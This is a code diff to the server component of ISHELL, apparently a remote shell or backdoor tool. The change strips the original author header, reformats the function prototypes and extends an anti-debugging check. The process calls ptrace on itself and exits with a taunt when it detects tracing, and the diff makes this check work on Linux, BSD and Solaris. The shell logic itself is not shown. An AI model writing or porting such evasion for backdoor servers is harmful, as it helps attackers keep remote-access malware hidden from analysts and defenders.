@@ -1,17 +1,14 @@
-/* ISHELL: server
- * by: Peter Kieltyka (elux)
- * http://peter.eluks.com / peter@eluks.com 
- * Updates from 0.2 by Mephistolist */
 #include "ishell.h"
+#include <sys/ptrace.h>
 
 /* global variables */
-int     ish_debug = 1;
+int ish_debug = 1;
 
 /* function prototypes */
-void    usage(char *);
-void    sig_handle(int);
-int     edaemon(void);
-int     ish_listen(int, struct sockaddr *, socklen_t);
+void usage(char *);
+void sig_handle(int);
+int edaemon(void);
+int ish_listen(int, struct sockaddr *, socklen_t);
 
 void usage(char *program) {
     fprintf(stderr,
@@ -102,9 +99,19 @@ int ish_listen(int sockfd, struct sockaddr *sin, socklen_t sinlen) {
 int main(int argc, char *argv[]) {
 
     // Attempt to use ptrace to prevent being traced
-    if (ptrace(PTRACE_TRACEME, 0, NULL, NULL) < 0) {
-        puts("being traced");
-        exit(1);
+    #if defined(__linux__)
+    	if (ptrace(PTRACE_TRACEME, 0, NULL, NULL) < 0) {
+    #elif defined(__FreeBSD__) || defined(__BSD__)
+    	if (ptrace(PT_TRACE_ME, 0, 0, 0) < 0) {
+    #elif defined(__sun) // Check for Solaris
+    	if (ptrace(PT_TRACE_ME, 0, NULL, NULL) < 0) {
+    #else
+    	#error "Unsupported OS"
+    #endif
+	if (errno == EPERM) {
+            puts("Not today Jesus!");
+            exit(1);
+        }
     }
     
     int     opt, sockfd;
